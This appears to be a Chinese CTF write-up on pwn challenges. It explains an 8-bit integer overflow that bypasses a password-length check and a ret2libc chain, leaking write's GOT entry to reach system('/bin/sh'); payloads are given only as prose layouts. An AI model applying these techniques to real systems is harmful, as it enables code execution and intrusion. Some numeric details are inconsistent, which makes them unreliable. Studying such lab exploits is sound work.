题目中限制了密码的长度是在4~8（也就是v3 <= 3u || v3 > 8u）之间的，但是需要覆盖的dest内存为0x14。

·

这里需要引入一个叫做整形溢出的概念，在main函数中我们已知v3是8为字节数，也就是255位的数，正常来说，也就是在一般条件下。我们输入的字节是不会大于这个数的。但是，在极端条件下，人为的输入过长的字符串已经超过了255个字节，例如256个字节，程序就会认为我们输入的数为0个字节，但是程序还是会对总长为266的字符串产生出结果，达到我们想要的目的。也就是相当于一个人转了360度，朝向的方向还是相同的。

在这个题目当中，限定了输入的长度（4~8）。我们输入完payload之后，溢出v3这个整形数据到259~263之间。

就能绕过限制密码长度的这个判定了

由于题目中拥有直接的cat flag，那么就只有把函数溢出然后ret到这个地址就可以了。

所以payload = 覆盖dest0x14 + 覆盖EBP0x04 +system（“/bin/sh”）函数的地址 + 填充数据到字节为260的值

ida查看代码

在这个ida里面可以看见是没得system函数的，但是可以看见有libc，直接用LibcSearcher调用libc文件中的内容就能行，然后这里牵扯到关于plt，got以及动态链接的问题，可以看看我的另外一篇博客关于got和plt的不完全总结 虽然很有可能看了也不晓得看了个啥，因为写的人就很辣鸡

题目不难理解，就和level0和level2差不多得函数，只是缺少了system函数而已，因此我们用到libc的内容来构造ROP链。总的思路就是

  1. 先得到write函数plt与got的值，得到write的真实地址。
  2. 通过LibcSreacher获取libc 的版本
  3. 通过libc的版本找到system，/bin/sh的值
  4. 计算偏移值
  5. 得到shell

总的来说，步骤就是这样的。

所以payload1 = 覆盖buf段 + 覆盖EBP + 调用write + vuln覆盖ret地址（重新进入vuln函数） +文件描述符 + 重新调用write + 写入的长度

payload2 = 覆盖buf段 + 覆盖EBP + 调用system的值 + 返回地址 + 调用binsh的值

但是我在第一次调用这个值的时候，就是不能第二次进去vuln函数，然后我就改了改前面的那个参数从0x0改成0x1，然后就可以了，别问我为什么，我也不晓得
